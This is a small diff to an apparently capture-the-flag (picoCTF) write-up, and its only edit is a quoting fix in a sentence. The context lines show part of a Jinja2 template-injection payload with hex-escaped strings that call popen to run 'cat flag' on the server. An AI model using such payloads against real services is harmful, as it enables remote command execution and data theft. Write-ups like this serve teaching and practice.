@@ -255,4 +255,4 @@ Payload
 |attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67')
 |attr('\x72\x65\x61\x64')()}}
 ```
-and prints the picoCTF flag in the <h1> element.
+and prints the picoCTF flag in the "<h1>" element.
